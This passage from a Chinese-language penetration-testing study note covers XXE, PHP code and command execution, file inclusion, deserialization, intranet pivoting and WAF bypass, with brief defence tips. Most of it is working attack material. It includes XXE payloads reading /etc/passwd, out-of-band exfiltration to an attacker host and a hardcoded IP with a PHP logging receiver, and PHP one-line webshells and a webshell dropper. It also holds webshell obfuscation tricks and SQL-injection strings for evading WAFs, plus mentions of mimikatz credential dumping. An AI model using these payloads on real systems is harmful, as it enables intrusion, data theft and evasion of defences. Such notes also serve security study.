息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。\n\n\n不按套路出牌：\n\n多去想想开发者没有想到的地方\n\n\nPC端尝试过，wap（网页）端也看看，app也试试。\n\n防御支付漏洞：\n后端检查每一项值，包括支付状态。\n校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量。\n与第三方支付平台检查，实际支付的金额是否与订单金额一致。\n支付参数进行MD5加密、解密、数字签名及验证，这个可以有效地避免数据修改，重放攻击中的各种问题。\n金额超过阈值，进行人工审核。\n\n十、XXE——实体注入productId=1&amp;storeId=1 ，当我们抓包分析数据时，有参数传递时，我们不仅要测是否存在sql注入，也可以看看是否有xxe。有时在前端是正常传数据，但是在服务器端就会将我们的参数值嵌入到了xml文档中进行解析，此时就有可能存在xxe漏洞。\n什么是XML：\nXML指可扩展标记语言。\nXML是一种标记语言，很类似HTML。\nXML的设计宗旨是传输数据，而非显示数据。\nXML标签没有被预定义。您需要自行定义标签。\nXML被设计为具有自我描述性。\nXML是W3C的推荐标准。\n\n特点：\n\nXML仅仅是纯文本，他不会做任何事情。\nXML可以自己发明标签（允许定义自己的标签和文档结构）\n\n总的来说XML就是个存储数据的东西。\n存储数据流程：\n存一份模板——&gt;再存一堆东西\n模板怎么来：去加载某个文件，这个部分为DTD，这里可以获取访问加载xxxx，那么是不是可以获取本机文件呢\n\nXML一定会被后端代码所调用\nXXE是什么：XXE：XML外部实体注入；用户输入的数据被当做xml代码执行\n典型的攻击如下：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;\t\t\t#XML声明\n&lt;!DOCTYPE foo[\t\t\t\t\t\t\t\t\t\t#&#125;\n\t&lt;!ELEMENT foo ANY&gt;\t\t\t\t\t\t\t\t#&#125;\t这三行是DTD部分\n\t&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;\t\t#&#125;\n&lt;foo&gt;&amp;xee;&lt;&#x2F;foo&gt;\t\t\t\t\t\t\t\t\t#XML部分\n\n定义实体必须写在DTD部分\n实体实际上就是变量\nXXE原理：XXE是外部实体注入漏洞，应用程序解析xml输入 时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行，内网端口扫描攻击内网网站等危害。\nphp中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象，实例：\n&lt;?php\n    $test &#x3D; &#39;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;&#x2F;scan&gt;&#39;;\t#取1.txt存储在test实体中\n    $obj &#x3D; simplexml_load_string($test,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);\n    print_r($obj);\n?&gt;\n\n变量test里面是XML，然后使用simplexml_load_string将其转化为对象，第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMLElement这个类，然后LIBXML_NOENT是替代实体，然后他去执行了file协议去读取我的文件。\n有了XML实体，关键字’SYSTEM’会令XML解析器从URL中读取内用，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）\n读取文件，路径怎么判断：\n\n强行猜解；\n传特殊参数想办法报错\n找报错的页面找到泄露的路径\n\n外部文档声明：\n假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：\n&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;\n\n\n\n漏洞危害：\n读取敏感文件\n执行ssrf漏洞，进行内网端口探测，攻击内网网站等。\n\nXXE-扩展&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;\n\n外部应用可扩展http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下：\nlibxml2：file、http、ftp\n\nPHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar\n\nJava：http、https、ftp、file、jar、netdoc、mailto、gopher *\n\n.NET：file、http、https、ftp\n\nSSRF和XXE最大的功能就是发送请求。\nXXE也存在不给你显示（输出）的情况（类似于盲注），解决方法：\n\n利用其他东西证明其存在\n将想要的数据外带出来，如DNS注入、反弹注入\n\n我们可以使用一个类似于接收平台一样的接收器，XML读取数据然后发送到接受的平台，然后接收平台存储，我们再去接收平台查看就可以了。\n我们先读取我们想要的文件，然后为了传输方便，我们先来个base64编码，我们可以使用php伪协议读取文件base64编码（仅PHP支持）\nphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;1.txt\n\n然后我们再去调用一个外部xml比如1.xml（&lt;!ENTITY % remote SYSTEm &quot;http:&#x2F;&#x2F;192.168.19.131&#x2F;1.xml&quot;&gt;）\n&lt;!ENTITY % all\n&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;120.203.13.75:8123&#x2F;xxe&#x2F;2.php?id&#x3D;%file;&#39;&gt;&quot;\n&gt;\n%all;\n\n这个1.xml会被加载到原本的xml，然后我们最后来调用，然后你读取出来的文件会用get传参的方式传参给2.php，然后2.php记录下存储到3.txt中\n&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;\n\n我们可以通过获取别人访问我这个文件传的参数，然后将这个参数储存下来，来做到获取别人数据的方法，所以我们需要一个炮台（公网IP）来让别人访问的到。\n除了纯静态网站，大部分往回走哪都会跟数据库交互的，那么肯定有一个文件内有数据库的账号，密码，一般会有一个配置文件会存着IE东西，访问一个文件很有可能会是空白，但是是存在的。\n做渗透测试现在本地浮现成功了再去线上做，因为线上可能会有动静而被发现。\n漏洞检测：\nXInclude攻击\n\n一些应用程序接收用户的数据，在服务端嵌入到xml文档中解析。\n这是我们无法控制整个xml文档，所以就无法定义或修改DOCTYPE元素。XInclude是xml规范的一部分，允许从子文档中构建xml文档，从而进行攻击。\n直接将参数改为以下面的值：\n&lt;foo xmlns:xi&#x3D;&quot;htttp:&#x2F;&#x2F;www&#x2F;.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;\n&lt;xi:include parse&#x3D;&quot;text&quot; href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt;&lt;&#x2F;foo&gt;\n\n原本的参数值就是productId=1，我们怎么能知道在服务端嵌入到了xml文档中解析。所以，遇到这种参数，我们除了试一下sql注入，还能试试是否存在xxe。\n\n利用文件上传来进行xxe攻击\n\ndocx和svg等都是基于xml格式，如果图像处理库支持SVG图像，攻击者可以提交恶意的SVG图像，就可以利用文经上传执行xxe攻击。\n创建具有xml代码的SVG图像：\n&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hostname&quot; &gt; ]&gt;&lt;svg width&#x3D;&quot;128px&quot; height&#x3D;&quot;128px&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version&#x3D;&quot;1.1&quot;&gt;&lt;text font-size&#x3D;&quot;16&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;16&quot;&gt;&amp;xxe;&lt;&#x2F;text&gt;&lt;&#x2F;svg&gt;\n\n将此图像上传上去，就可以在头像上看到/etc/hostname文件的内容。\n\n通过修改请求包的文件内用类型来进行xxe攻击\n\n有些应用程序会允许xml的内容类型，我们就可以修改Content-Type：text/xml字段，来利用xxe漏洞。\nPOST &#x2F;action HTTP&#x2F;1.0\nContent-Type: text&#x2F;xml\nContent-Length: 52\n\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;&#x2F;foo&gt;\n\n#原来的请求体中的内容是：foo&#x3D;bar\n\n\n读取敏感文件\n\n利用file协议读取服务器中的敏感文件\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;\n#在参数位置输入&amp;xxe;就行。\n&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;&#x2F;productId&gt;&lt;&#x2F;stockCheck&gt;\n\n\n执行ssrf攻击\n\n利用http协议，让存在xxe漏洞的应用程序向与它处于同意内网的发送http请求。\n也可利用其他协议，例如：ftp，data，等。\n&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:3389&quot;&gt;]&gt;\n\n\n带外通道技术来进行盲注xxe\n\n一般情况下，虽然存在xxe漏洞，但是不会回显外部实体注入的值，我们就要利用带外通道技术。（OOB）\n攻击者在vps中防止恶意的DTD，让存在漏洞的应用程序去访问。\n恶意DTD（外部实体）内容，访问http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd可以访问到该DTD\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;wdb-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;\n%eval;\n%exfiltrate;\n\n向存在漏洞的应用程序中输入：\n&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd&quot;&gt; %xxe;]&gt;\n\n\n通过错误消息读取文件从而利用盲注xxe。\n\n通过触发xml解析错误，在解析错误消息中返回我们需要读取的敏感消息。\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEm &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%fiel;&#39;&gt;&quot;&gt;\n%eval;\n%error;\n\n漏洞防御\n使用开发语言提供的禁用外部实体的方法。\n过滤用户输入的xml数据中的关键字。\n不允许xml中you用户自定义的文档类型。\n\n十一、代码执行漏洞漏洞原理：用户输入的数据被当做后端代码执行\nRCE（remote command/code execute）远程命令或者代码执行。现在因为RCE这个词的滥用，RCE的范围比较广，只要渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件getshell都可以属于RCE。\n造成代码执行的函数这里将要执行的代码写成$a\n1、eval($a);\t\t\t#eval是代码执行用得最多的，他可以多行执行\n\teval($_REQUEST[&#39;a&#39;]);\n\t\n2、assert($a);\t\t#只能单行执行\n\tassert($_REQUEST[&#39;a&#39;])\t\t#想要使用assert进行多行执行，就要进行写文件然后执行，例如：\n\tfile_put_contents(&#39;1.php&#39;,&#39;&lt;?php var_dump(8);phpinfo();?&gt;&#39;)\n\t\n3、preg_replace()\t#正则替换函数\n\t&lt;?php preg_replace(&#39;&#x2F;a&#x2F;e&#39;,&#39;$_GET&#39;,&#39;abc&#39;);\t\t#当出现&#x2F;e的修饰符，就会存在代码执行，其中，abc中的a必须存在才会发生替换，函数也才会触发。\n\t\n4、create_function()\t#匿名函数\n\t$a &#x3D; create_function(&#39;$id&#39;,&#39;echo $id;&#39;);\t\t#自定义函数$a\n\techo $a(8);\t\t\t\t\t\t\t\t\t\t#执行echo $id；；因为$id我传参是8所以echo $id；\n\n5、array_map()\t\t#回调函数，调用某个函数。\n\t\t一句话木马：\n\t\tarray_map(&#39;assert&#39;,array($_POST[&#39;c&#39;]));\n\t\t\n\t\tarray_map($REQUEST[&#39;b&#39;],array());\n\t\t请记住：eval是无法调用的，因为eval比较特殊，不认为是函数，属于特殊写法。\n\t\tcall_user_func()\t也可回调，回调函数在PHP有很多\n\t\t\n6、特殊组合（双引号二次解析）\n\tPHP版本5.5及其以上版本可以使用\n\t&quot;$&#123;phpinfo()&#125;&quot;;\t\t&#x3D;&gt;执行代码phpinfor()\n\t\n\tPHP的字符串是可以使用复杂的表达式。例如$&#123;中间可以写调用的函数&#125;\n\t$&#123;phpinfo()&#125;;\t\t&#x2F;&#x2F;可以执行\n\t$a $&#123;phpinfo()&#125;;\t&#x2F;&#x2F;可以执行\n\n安装CMS时写入{$_REQUEST[8]}就会被写入配置文件：\n\n怎么样进入CMS安装页面：\n往回走哪的提示：安装过的CMS它有锁    install.lock这样的文件，我们只要删除或者更名这个install.lock即可重新安装此CMS\n\n安装究竟做了什么？\n\n\n①：检测你的黄静是否符合条件；\n②：把数据库信息写入配置文件；\n③：连接数据库，写入数据。\n如何删除锁：\nunlink()：删除文件函数。但是删锁的操作需要代码审计。\n十二、本地包含与远程包含什么是文件包含漏洞？攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当做脚本文件来执行）。\n一句话来说就是：文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。\n注：包含文件很有用，可以简化代码，文件包含就是为了重复使用相同的代码。\n文件包含分为本地文件包含LFI和远程文件包含RFI（需要allow_url_include = On）\n本地文件包含LFI：包含服务器上的资源，比如你上传的马；\n远程文件包含RFI：通过http协议包含其他地方的资源。\n\n利用场景：\n假如你进入了后台，那么后台中的没一个页面应该都会验证你的权限，但是每个PHP文件中都写验证的那段代码就会佷冗余，于是开发定义了一个文件包含函数，可以引用那个用于验证的代码写的文件。\n那么这个文件里的内容一定会被当做PHP执行，不管任何后缀。\n\nfile_put_contents()：创建文件\n&lt;?php file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39;);?&gt;\n\n文件包含本身只是一个功能，但是当你能够任意控制包含的文件时，文件包含就有漏洞了。\n函数解析：include：用到临时加载（临时加载然后使用）[不影响整体]。使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。\n\nrequire：先加载，然后整合原有代码，然后一起执行[影响整体]。在php我呢间被执行之前，php解析器会用被引用的我呢间爱你的全部内容奇幻require语句，然后与require语句之外的其他语句组成个新的php文件，最后按新的php文件执行代码程序。\n\ninclude_once：使用include_once会在导入文件前先检测该文件是否在该页面的其他部分被应用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）。\n\nrequire_once：require_once语句的延伸，它的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已经在该程序中的其他地方被引用过，如果有，则不会再重复调用该文件。（同时使用require_once语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）。\n\nPHP默认不能包含远程文件，需要开启allow_url_include = On\n虽然远程文件包含需要改配置，但是在windows中可以通过SMB服务使本地文件包含变成远程包含。\ncmd的小技巧：\ncd xxxxx&#x2F;..&#x2F;admin\n先进入xxxxx文件，再..&#x2F;跳出文件夹，然后再跳入admin，写一个不存在的路径，然后跳出来，再去访问其他。\n\n在php里面？代表传参，所以会报错。文件包含的内容里面是不能出现？\n\n十三、变量覆盖漏洞什么是变量覆盖：变量覆盖指的是可以用我们的传参值替换程序原有的变量值，自身危害由代码本身来决定。\n如何寻找变量覆盖：经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。\n引发变量覆盖漏洞的函数：extract()：\n作用：将数组变成变量。\n&lt;?php\n$a &#x3D; &quot;1&quot;;\n$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);\nextract($my_array);\necho &quot;\\$a &#x3D; $a; \\$b &#x3D; $b; \\$c &#x3D; $c&quot;;\n?&gt;\n \n运行结果：$a &#x3D; Cat; $b &#x3D; Dog; $c &#x3D; Horse\n\nparse_str()：将查询字符串解析到变量中，即把字符串变成变量\n&lt;?php\n\tparse_str(&quot;name&#x3D;gyy&amp;&amp;age&#x3D;60&quot;);   \n\techo $name.&quot;&lt;br&gt;&quot;;\n\techo $age;\n\t?&gt;\n\n输出了gyy和60 \n\nimport_request_variables()\nPHP中：=：赋值；==：比较（值）；===：即比较值又比较类型\ntrim()：去掉变量头部和尾部的空格；\nisset()：检查变量是否存在。\n变量覆盖漏洞=&gt;特定属于白盒代码审计的。\n白盒与黑盒的区别就是：是否有源代码。\n函数解析不仅仅是函数会导致变量覆盖，有些特殊符号的特殊搭配也会引起变量覆盖漏洞，比如$$\n$$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现。如以下示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test会将$name的值覆盖，变成test。\n例题：\n&lt;?php\n$a &#x3D; 1;\nforeach(array(&#39;_COOKIE&#39;,&#39;POST&#39;,&#39;GET&#39;)as $_request)&#123;\nforeach($$_request as $key &#x3D;&gt; $value)\n&#123;$$_key &#x3D; addslashes($value);&#125;\n&#125;\necho $a;\n?&gt;\n\naddslashes()：魔术引号的函数，在每个双引号前加一个反斜杠。\n\n这个代码会接受我们的GET提交、POST提交、COOKIE参数，将这个接受来的参数一次放入$_request\n\t$key&#x3D;&gt;$_value这是个数组解析，实际上就是键值分离。\n正常而言$a &#x3D; 1是一个定值，但是因为$$_key的缘故，当我传参a&#x3D;2；那么$$_key&#x3D;addslashes($_value);\n就变成了$a&#x3D;2。\n\n\n\n\n每一个cookie都会在服务器上对应一个session；\ncookie只是字符串，本身没有什么意义，只是网站随机分配；\nsession决定你是否有权限，存在服务器上的，一般在一个php文件内。\n十四、unserialize反序列化漏洞什么是序列化和反序列化序列化：当在php中创建了一个对象后，可以通过serialize()把这个对象转变成 一个字符串，保存对象的值方便之后的传递与使用。\n反序列化：就是将字符串转变为对象供程序使用。\n序列化=&gt;存档[保存当前的状态]    serialize()\n反序列化=&gt;读档[还原序列化时的状态]    unserialize()\n什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup()等函数，当传给unserialize()的参数可控时，那么用户可以注入精心构造的一些恶意代码payload，从而导致反序列化漏洞。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。\nPHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下可以做到自动触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。问题就出现在重载过程中，执行了相关代码。\n魔术方法自动触发的函数，满足条件就触发，总共有11个。\n__get($property)：当调用一个未定义的属相时访问此方法；\n__set($property,$value)：给一个未定义的属性赋值时调用。\n\n__isset($property)：当在一个未定义的属性上掉员工isset()函数时调用此方法；\n__unset($property)：当在一个未定义的属性上调用unset()函数时调用此方法。\n\n__call($method,$arg_array)：当调用一个未定义（包括没有权限访问）的方法是调用此方法\n\n__autoload()：使用尚未被定义的类时自动调用。通过此函数，脚本引擎在PHP出错失败前有了最后一次机会加载所需的类。注意：在__autoload函数中跑出的异常不能被catch语句块捕获并导致致命错误。\n\n__construct()：对象创建的时候会自动调用；\n__destruct()：对象销毁的时候会自动调用。\n\n_clone()：PHP5中的对象赋值是使用的引用赋值，使用clone方法赋值一个对象时，对象会自动调用__clone魔术方法，如果在对象赋值需要执行某些初始化操作，可以在__clone方法实现。\n\n__toString()：在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。\n\n__sleep()：序列化的时候用；\n__wakeup()：在使用unserialize()函数时会被调用。\n\n__set_state()：当调用var_export()时，这个静态方法会被调用（自PHP5.1.0起有效）。本方法的唯一参数是一个数组。\n\n__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用。PHP5.3.0以上版本有效。\n\n__callStatic()：他的工作方式类似于_call()魔术方法，_callStatic()是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP确实加强了对__callStatic（方法的定义；它必须是公开的，并且必须被声明为静态的。\n同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。\n\n对象被调用后就被销毁\n总结：反序列化漏洞：\n危害在于魔术方法里面写了什么；\n找到一个可以操作的变量$this-&gt;xxxx;\n找到一个反序列化的地方（会执行序列化的点）\n我们要传参控制那个变量并触发魔术方法。\n\na存在反序列化，且你能控制内容。a被很多文件包含了，那么这个时候，那些包含了a文件的代码里面如果有类，你都可以调用。\n构造利用链：你的参数-&gt;反序列化函数\n\n__FILE__：当前的绝对路径\n&lt;? &#x3D;$todo ?&gt;   &lt;&#x3D;&gt;\t&lt;?php echo $todo ?&gt;\n\n开发不傻，正常而言不可能给你各种传参影响，所以在项目中用的是phar协议来自动触发反序列化==&gt;读取文件的地方都能用。\n防御反序列化漏洞\n不要把用户的输入或者是用户可控的参数直接放进方序列化的操作中去。\n在进入反序列化函数之前，对参数进行限制过滤。\n鉴定权限，反序列化结构进行鉴定权限，仅允许后台管理等特许人员才能调用。\n白名单，限制反序列化的类。\nRASP（Runtime application self-protection，运行时应用自我保护）检测。\n\n十五、命令执行漏洞原理：用户输入的数据被当做系统命令执行\n简介命令执行漏洞是指攻击者可以随意执行系统命令。属于代码执行的范畴。命令执行漏洞不仅仅存在于B/S架构中，在C/S架构中也常遇到。\n简单来说，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变$PATH或者程序执行环境的其他方面来执行一个恶意构造的代码。\n漏洞产生原因没有对用户输入的进行过滤或过滤不严，例如：没有过滤&amp;、&amp;&amp;、|、||等连接符号。\n系统漏洞造成的命令执行：bash破壳漏洞(CVE-2014-6271)，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等。\n调用的第三方组件存在代码漏洞，例如：\nphp（system()、shell_exec()、exec()、eval())\nJAVA中的命令执行漏洞（structs2&#x2F;ELasticsearchGroovy等）\nThinkPHP命令执行\n\nPHP下命令执行函数\nsystem()\n执行命令输出结果\n\necho exec(‘whoami’)\nPHP会去操纵计算机执行whoami的命令，且获取最后一行数据\n\necho shell_exec(‘whoami’)\nPHP会去操纵计算机执行whoami的命令，且获取所有数据。\n\npassthru(‘whoami’)\n只调用命令，把命令的运行结果原样的直接输出到标准输出设备。\n\n特殊符号，反引号（`）=&gt; echo ‘whoami’\n反引号其实就是调用的shell_exec()函数。shell_exec(被禁用了的话，反引号也不能用，但只是被过滤就不一样。\n\n$a = popen(‘whoami’,’r’); echo fread($a,1024);\n\n\ncmd简单命令：\nnetstat -ano \t查看端口\ntasklist\t查看进程\nipconfig\t查看ip\nkill\t\t杀死进程的\narp -a\t\t探测路由表\nwhoami\t\t查看当前权限\nshutdown\t关机（关闭杀软服务，然后重启主机）\nsysteminfo\t查看系统状态\nnet user\t查看用户\nnet user a abc123 &#x2F;add\t添加用户\n\n十六、内网渗透内网渗透\nSQL注入写入webshell\n\n提权\n\n利用目标主机上的服务提权（目标主机运行着xxx软件，但是这个软件有漏洞可以利用）\n利用web服务（一台机器上有可能有多个网站，多个web容器），比如A站是低权限运行的，B站是高权限运行的，然后通过webshell拿下A站之后再往B站写马，进而拿到高权限。\n利用windows漏洞|Linux漏洞，systeminfo可以查看打过哪些补丁，然后去网上找存在什么样的漏洞，然后找对应的提权工具。\n\n\n正向连接——内网穿透\n利用reGeorg：可以将我们传输的数据给目标站点，然后打开并配置Proxifier，之后直接可以用mstsc远程连接。\n然后横向渗透，探测内网\n\narp -a\n可以上3389装nmap，扫描内网ip\n\n\n猕猴桃抓取管理员密码\n一个服务器管理员管理多台及其，管理员密码可能都相同，用猕猴桃可以抓取到。\n\n\n域渗透域控的账号密码可以登录任意的域中的电脑。\nWindows认证协议——Kerberos\n黄金票据（后门），还有白银票据：\n一个是用的域控用户账号，一个用的是krbtgt账户\n制作黄金票据需要用到猕猴桃工具（法国神器）。\n十七、APP渗透APP渗透和Web渗透基本没有区别\n十八、绕过WAFsql绕过WAF的检测核心就是正则表达式，虽然还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。这里主要讲针对SQL注入。\n当我们遇到WAF拦截是正则匹配，第一反应就是：替换函数。\n例如：id=1 and 1=1\nWAF对and进行了拦截，那我们可以尝试一下运算符，如：&amp;。\n如果发现只输入and不拦，那么就要想办法改一改1=1，可以试试-1=-1.\n甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过。\n这里要说一个叫做内联注释的东西。\n内联注释：是MYSQL为了保持与其他数据兼容，将MYSQL中特有的语句放在/!…*/中，这些语句在不兼容的数据库中不执行，而在MYSQL自身确定识别，执行。\n在url栏中特殊符号有自己特殊的含义，&amp;就代表连接传参的，例：id=1 &amp; id=2。\n将&amp;进行url编码再输入就代表数据库中的与运算了。\n也可以使用十六进制0x来试下，例：id=0x31\n可以个order by直接union select，拦截了union select就试一下union all select，还是被拦就用内联注释\n&#x2F;**&#x2F;：在数据库中代表注释\n\n&#x2F;*!*&#x2F;：是内联注释，在内联注释里面的SQL语句会被执行。\n\n当内联注释\nunion &#x2F;*!select*&#x2F;\n\n也被拦截了，可以尝试加入版本号50001，即\nunion &#x2F;*!50001 select*&#x2F;\t\t#代表数据库版本为5.00.01时执行\n\n若还是被拦截下，就是下5000，因为5000版本不存在，可能就不拦了，但是执行不了，那么有可能有些版本号被漏掉，使union select既能执行又能绕过的，用burp爆破一下，从10000-99999\n这个绕过后，尝试\nunion &#x2F;*!10044 select*&#x2F; 1,2,3 from admin limit 1,1\n\n很可能被拦，那就一段段的删，判断拦截的是哪里，判断出form admin这里被拦的话，再用内联注释就绕不过去了，可以尝试以下方法：\n常见手法：\n\t大小写绕过（很老的WAF才有用）\n\t替换饶过（很老的WAF才有用）[和上传文件pphphp一样]\n\t特殊字符绕过（%0a换行）\n\t编码绕过（比如会多次解码的东西）\n\t等价替换（利用其他函数替换）[union #%0aselect 拦截][union all #%0aselect不拦截]\n\t容器特性（例如Apache的Hpp，或者是IIS的%分割）\n\t白名单（管理员权限或者是127.0.0.1本地访问不拦截）\n\t缓冲区（数据太多了，超出了WAF检测的范围）填充大量字符来溢出，例如填入大量的注释内容，安全狗大约4千多个字符就能绕过。\n\n用%0a换行绕过的：\n-- qwe &#x2F;*%0afrom admin %23*&#x2F;\t\t\t%23代表#，在mysql里是注释\n\n因为%0a代表换行，所以这里相当于\n-- qwe &#x2F;*%0a*&#x2F;\nfrom admin #\t\t\t-- qwe注释掉了&#x2F;*，%23注释掉了*&#x2F;\n\n然后安全狗认为/**/里面的东西是安全的。\n有些特殊字符加了反引号也是可以运行的，例：\n&#96;sleep&#96;(5)\n\n容器特性绕过：\n在IIS中\ns%e%l%e%c%t 与 select 是等价的\n\nApache中的参数污染\n(1条消息) 参数污染漏洞（HPP）挖掘技巧及实战案例全汇总_Restart222的博客-CSDN博客_hpp漏洞\n例：\nid&#x3D;1\t\t会显示1的内容\n\nid&#x3D;1&amp;id&#x3D;2\t会显示2的内容\n\nid&#x3D;1&#x2F;*&amp;id&#x3D;2%23*&#x2F;\t相当于安全狗认为注释内的安全，然而执行的则是id&#x3D;2\n那么id&#x3D;1 &#x2F;*id&#x3D;2 union select 1,password,3 from admin limit 1,1%23*&#x2F;\n\nwebshell的绕过例如：最常见的PHP一句话木马\n&lt;?php eval($REQUEST[&#39;a&#39;])?&gt;\n\n我们尝试只写&lt;?php eval();?&gt;发现没有拦截，但是加了$_REQUEST[&#39;a&#39;]就拦截了，那么我们是不是可以尝试测试看看究竟拦截$_REQUEST[&#39;a&#39;]的那个部分。\n\n然后测试发现，他拦截的是$_REQUEST[那么我们只要不出现中括号就可以解决对吗，或者我们尝试把这个变量换一个就可以解决。\n\n例如：&lt;?php eval(end($_REQUEST));?&gt;\n这个语句就没有出现$_REQUEST[所以成功绕过，我们用end代替了[]\nend函数的意义：输出数组中的当前元素和最后一个元素的值，然后因为我的传参寄一个。\n但是唯一不好的就是它没有密码，即传参名，所以用什么当密码都行。\n\n常见绕过手法：1、通过常量定义：\n&lt;?php define(&quot;a&quot;,&quot;$_GET[1]&quot;);eval(a);\n\n2、通过字符串拼接+双美元符号：\n&lt;?php \t$a&#x3D;ass;\n\t\t$b&#x3D;&#39;ert&#39;;\n\t\t$funcName&#x3D;$a.$b;\n\t\t$x&#x3D;&#39;funcName&#39;;\n\t\t$$x($_REQUEST[1]);\n\t\t\n3、通过函数定义强行分割：\n&lt;?php \n\tfunction a($a)&#123;\n\treturn $a;&#125;\n\teval(a($_POST)[&#39;a&#39;]);\t\t&#x2F;&#x2F;强行分割$_POST[&#39;a&#39;]\n\n4、通过类定义，然后传参强制分割：\n&lt;?php\n\tclass User\n\t&#123;\n\tpublic $name &#x3D; &#39;&#39;;\n\tfunction __destruct()&#123;\n\teval(&quot;$this-&gt;name&quot;);\n\t&#125;\n\t&#125;\n\t$user&#x3D; new User;\n\t$user-&gt;name 